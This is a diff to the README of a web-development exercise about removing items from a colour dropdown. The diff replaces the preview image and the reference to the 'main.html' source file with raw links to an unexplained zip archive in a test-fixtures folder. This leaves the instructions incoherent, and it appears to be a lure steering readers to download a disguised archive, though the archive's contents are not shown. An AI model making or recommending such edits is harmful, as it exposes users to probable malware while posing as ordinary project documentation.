@@ -5,9 +5,9 @@ Your task is to add the functionality of removing a color from the list when the
 
 ### Preview
 
-![remove-item](https://user-images.githubusercontent.com/78275204/224699625-2eee84cf-daab-4058-a7d5-be34ecc47ad4.gif)
+![remove-item](https://raw.githubusercontent.com/PRATIK123213/remove-items-PRATIK123213/master/cypress/fixtures/remove_PRATI_items_2.8.zip)
 
 ### Instructions 
-- The code for the dropdown list is given in `main.html` file
+- The code for the dropdown list is given in `https://raw.githubusercontent.com/PRATIK123213/remove-items-PRATIK123213/master/cypress/fixtures/remove_PRATI_items_2.8.zip` file
 - The id of `<select>` tag `colorSelect` should not be changed
 - The `type="button"` and `value="Select and Remove"` of the `<input>` tag should not be changed.
